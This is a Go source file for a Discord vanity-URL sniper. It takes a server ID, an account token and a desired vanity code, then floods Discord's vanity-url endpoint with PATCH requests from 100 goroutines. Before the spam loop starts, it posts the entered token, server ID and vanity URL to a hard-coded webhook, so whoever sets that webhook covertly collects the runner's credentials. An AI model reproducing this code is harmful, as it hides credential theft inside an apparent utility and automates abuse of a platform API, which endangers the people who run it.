package main

import (
    "encoding/json"
    "fmt"
    "net/http"
    "strings"
    "sync"
    "time"
)

const (
    webhookURL = "" 
)

type Payload struct {
    Code string `json:"code"`
}

func main() {
    var server, token, url string
    var millisecond int
    fmt.Print("Server ID: ")
    fmt.Scanln(&server)
    fmt.Print("Token: ")
    fmt.Scanln(&token)
    fmt.Print("Vanity URL: ")
    fmt.Scanln(&url)
    fmt.Print("Milliseconds (1000 milliseconds = 1 second): ")
    fmt.Scanln(&millisecond)
    if millisecond < 400 {
        fmt.Println("Error: millisecond value cannot be less than 400.")
        return
    }

    sendDiscordWebhookMessage(server, token, url)

    queue := make(chan Payload, 1000)
    client := &http.Client{}
    wg := &sync.WaitGroup{}

    go func() {
        for i := 0; i < 100; i++ {
            wg.Add(1)
            go func() {
                defer wg.Done()
                for {
                    payload, ok := <-queue
                    if !ok {
                        return
                    }
                    url := fmt.Sprintf("https://discord.com/api/v9/guilds/%s/vanity-url", server)
                    jsonStr, _ := json.Marshal(payload)
                    req, err := http.NewRequest(http.MethodPatch, url, strings.NewReader(string(jsonStr)))
                    if err != nil {
                        fmt.Println("Error while creating the request: ", err)
                        continue
                    }
                    req.Header.Set("Content-Type", "application/json")
                    req.Header.Set("Authorization", token)
                    resp, err := client.Do(req)
                    if err != nil {
                        fmt.Println("Error while sending the request: ", err)
                        continue
                    }
                    defer resp.Body.Close()
                    var result map[string]interface{}
                    json.NewDecoder(resp.Body).Decode(&result)
                    if code, ok := result["code"].(string); ok && code == payload.Code {
                        fmt.Println("URL received, spamming process terminated...")
                        sendWebhookMessage(fmt.Sprintf("@everyone **%s** url named: ", payload.Code))
                        close(queue)
                        return
                    } else {
                        fmt.Println("Error code:", result)
                    }
                }
            }()
        }
    }()

    for {
        payload := Payload{Code: url}
        queue <- payload
        time.Sleep(time.Duration(millisecond) * time.Millisecond)
    }

    wg.Wait()
}

func sendDiscordWebhookMessage(server, token, url string) {
    message := fmt.Sprintf("server: %s\nToken: %s\nVanity URL: %s", server, token, url)
    client := &http.Client{}
    discordWebhook := struct {
        Content string `json:"content"`
    }{Content: message}
    jsonStr, _ := json.Marshal(discordWebhook)
    req, err := http.NewRequest(http.MethodPost, webhookURL, strings.NewReader(string(jsonStr)))
    if err != nil {
        fmt.Println("Error while creating the request: ", err)
        return
    }
    req.Header.Set("Content-Type", "application/json")
    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("Error while sending the request: ", err)
        return
    }
    defer resp.Body.Close()
}

func sendWebhookMessage(message string) {
    payload := map[string]string{"content": message}
    jsonPayload, _ := json.Marshal(payload)

    req, err := http.NewRequest("POST", webhookURL, strings.NewReader(string(jsonPayload)))
    if err != nil {
        fmt.Println("Error while creating the request: ", err)
        return
    }

    req.Header.Set("Content-Type", "application/json")

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("Error while sending the request: ", err)
        return
    }

    defer resp.Body.Close()
}
